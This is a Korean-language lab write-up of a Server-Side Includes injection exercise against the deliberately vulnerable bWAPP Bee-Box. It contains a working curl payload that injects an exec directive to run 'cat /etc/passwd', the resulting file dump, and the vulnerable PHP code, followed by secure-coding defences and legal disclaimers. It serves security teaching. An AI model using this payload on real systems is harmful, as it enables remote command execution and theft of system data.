# 웹 해킹 실습 교육: Server-Side Includes (SSI) Injection

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/ssii.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### SSI (Server-Side Includes) Injection이란?

웹 서버가 HTML 페이지를 클라이언트에게 전송하기 전에 포함된 디렉티브(명령어 구문)를 해석하고 그 결과를 동적으로 삽입하는 기술인 SSI(Server-Side Includes)를 악용하는 보안 취약점입니다. 사용자 입력 값이 적절한 필터링 없이 `.shtml`, `.shtm` 등의 확장자를 가진 SSI 해석 페이지에 그대로 반영될 때 발생합니다. 

공격자가 `<!--#exec cmd="..." -->` 와 같은 SSI 문법을 전송하여 악성 명령을 포함시키면, 웹 서버의 권한으로 시스템 내부의 **운영체제(OS) 명령어**가 직접 실행(RCE)되어 시스템 제어 권한을 탈취당할 수 있습니다.

### OWASP Top 10 분류
- **A03:2021** – Injection

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 취약점 페이지 (ssii.php) 분석
        (First name과 Last name 입력 폼 분석)
        │
        ▼
[2단계] SSI 환경 탐색 및 테스트
        (입력값이 출력되는 ssii.shtml 리다이렉트 흐름 확인)
        │
        ▼
[3단계] 악의적인 SSI 구문(Payload) 작성
        (<!--#exec cmd="명령어" --> 형식으로 주입)
        │
        ▼
[4단계] POST 요청 전송 및 시스템 명령 실행 대상 탈취
        (curl 등의 도구로 /etc/passwd 내용 로드)
        │
        ▼
[5단계] 탈취 결과 페이지 확인 (ssii.shtml)
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: 취약점 분석 및 원리 이해

1. 192.168.0.20 bWAPP의 `ssii.php` 페이지는 사용자의 First name과 Last name을 묻습니다.
2. 입력값을 제출하면 서버는 이 값을 조합하여 `.shtml` 형식의 임시 파일(`ssii.shtml`)에 쓰고 렌더링하도록 클라이언트를 리다이렉션합니다.
3. 이때 사용자의 입력값에 SSI 구문이 포함되어 있다면 웹 서버의 권한으로 해석 및 활성화됩니다.

---

### Step 2: SSI Injection (RCE) 시도

`firstname` 변수에 `<!--#exec cmd="cat /etc/passwd"-->` 를 삽입하여 웹 서버가 OS 명령어 `cat`을 실행하도록 유도합니다.

*(※ 쉘 환경 변수 확장을 피하기 위해 curl 데이터 전송 구간에 반드시 **단일 인용부호('')** 를 사용합니다.)*

```bash
# 1. ssii.php 폼에 악의적인 SSI 명령어(Payload) 전송
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -X POST \
     -d 'firstname=<!--#exec cmd="cat /etc/passwd"-->&lastname=test&form=submit' \
     "http://192.168.0.20/bWAPP/ssii.php"
```

> 💡 **동작 원리**: 서버 백엔드는 입력받은 문자열 그대로를 서버 내부 `ssii.shtml`에 작성하고 곧바로 리다이렉트 응답(HTTP 302)을 보냅니다.

---

### Step 3: 명령 실행 결과 (시스템 정보) 확인

생성된 `ssii.shtml`을 요청하여 명령어가 실제로 해석되어 출력이 담겼는지 확인합니다.

```bash
# 2. 실행 결과를 담은 페이지(ssii.shtml) 호출
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/ssii.shtml" | head -n 25
```

**실행 결과 (\/etc/passwd 파일 탈취 성공):**
```html
<p>Hello root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
www-data:x:33:33:www-data:/var/www:/bin/sh
... Test,</p>
```

> 🚨 **심각한 보안 위협**: 아파치/웹서버 프로세스 권한으로 사용 가능한 모든 시스템 명령을 마음대로 통제할 수 있습니다. 이를 통해 DB 자격증명을 읽어오거나 쉘(Reverse Shell) 접속을 여는 것도 가능해집니다.

---

## 📊 탈취 정보 요약

| 정보 유형 | 탈취된 데이터 내용 |
|-----------|------------------|
| **명령어 종류** | `cat /etc/passwd` |
| **명령 실행 권한** | `www-data` (웹 데몬 권한) |
| **운영체제 시스템 정보** | 시스템 모든 계정 테이블(`/etc/passwd`) |
| **웹 서비스 사용자 등** | 파일 조작, 백도어 웹쉘(Webshell) 파일 강제 설치 가능 |

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 발생 메커니즘
서버 측에서 사용자 입력값을 `.shtml` (SSI가 구동되는 페이지 확장자)로 동떨어져 저장 및 렌더링하고, 이때 `<!--#... -->` 와 같은 SSI 구조를 이스케이프(Escape)하지 않고 그대로 파일 스트림에 `fputs` 함으로써 발생했습니다.

```php
// bWAPP 취약한 코딩 예시 (입력 필터링 부족)
$firstname = $_POST["firstname"];
$line = '<p>Hello ' . $firstname . ' ...</p>';
fputs($fp, $line); // 안전하지 않은 문자열이 shtml 확장자에 그대로 주입됨
```

### 방어(Secure Coding) 가이드

1. **HTML 특수문자 치환 (HTML 인코딩) ⭐️**
   `<`, `>`, `!`, `#` 등 SSI 예약 문자를 클라이언트 입력단에서 허용하지 않고 안전한 엔티티(`&lt;`, `&gt;`, `&amp;`, `&quot;` 등)로 필터링해야 합니다. 
   PHP의 경우 `htmlspecialchars()` 함수를 사용하면 구문 인젝션을 사전에 강력히 방지할 수 있습니다.

2. **SSI 기능 사용 최소화 및 파일 확장자 제어**
   가급적 시대가 지난 SSI 템플릿 사용을 제거하고 안전성을 담보하는 모던 웹 프레임워크 템플릿 엔진을 사용해야 합니다. 
   불가피하게 사용해야 한다면 사용자의 입력을 포함하는 페이지는 `.shtml` 등 SSI 해석이 구동되는 설정으로 사용을 제한(금지)해야 합니다.

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 불법 행위**로 간주됩니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
